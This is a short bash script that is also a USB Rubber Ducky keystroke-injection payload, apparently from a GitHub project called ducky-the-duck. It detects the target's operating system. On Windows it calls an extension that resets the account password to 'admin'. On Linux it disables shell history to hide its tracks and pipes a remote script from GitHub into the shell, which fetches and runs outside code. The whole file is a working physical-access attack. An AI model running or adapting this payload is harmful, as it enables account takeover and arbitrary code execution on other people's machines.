#!/bin/bash

# TITLE EntryPoint ducky
# AUTHOR Saverio976
# DESCRIPTION call scripts from https://github.com/Saverio976/ducky-the-duck

# !EXTENSION!detect_ready.txt
# !EXTENSION!os_detect.txt

# !DUCKY!$_JITTER_ENABLED = TRUE
# !DUCKY!$_JITTER_MAX = 1
# !DUCKY!DEFINE ADVANCED_DETECTION TRUE
# !DUCKY!DETECT_OS()

# !DUCKY!IF ( $_OS == WINDOWS ) THEN

# Windows detected -----------------------------------------------------------
# !DUCKY!DEFINE NEW_PASSWORD admin
# !EXTENSION!change_windows_password.txt
# END Windows detected -------------------------------------------------------

# !DUCKY!ELSE IF ( $_OS == LINUX ) THEN

# Linux detected -------------------------------------------------------------
unset HISTFILE

export CURRENTSHELL=''
CURRENTSHELL=$(readlink /proc/$$/exe)

$CURRENTSHELL
unset HISTFILE

export CONFIGFILE=''
[[ "$CURRENTSHELL" == *"zsh"* ]] && CURRENTSHELL="zsh" && CONFIGFILE="${ZDOTDIR:-$HOME}/.zshrc"
[[ "$CURRENTSHELL" == *"bash"* ]] && CURRENTSHELL="bash" && CONFIGFILE="$HOME/.bashrc"

curl -sLf 'https://raw.githubusercontent.com/Saverio976/ducky-the-duck/main/script/linux/entrypoint.sh' | $CURRENTSHELL
# END Linux detected ---------------------------------------------------------

# !DUCKY!END_IF

# !DUCKY!ATTACKMODE STORAGE
